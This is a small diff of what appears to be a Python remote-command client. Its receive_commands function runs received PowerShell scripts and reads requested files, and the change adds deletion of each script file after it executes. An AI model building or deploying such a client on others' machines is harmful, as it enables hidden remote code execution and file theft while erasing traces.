@@ -95,8 +95,6 @@ def receive_commands():
         elif received_command[0] == "run":
             command_result = run_powerShell_script(data= received_command[2])
 
-            
-            
 
         elif received_command[0] == "download":
             command_result = read_file(received_command[1])
@@ -119,6 +117,7 @@ def run_powerShell_script(data):
 
     write_file(path=file_path, content=data)
     result = execute_command("PowerShell -File " + file_path)
+    os.remove(file_path)
     return result
     
 
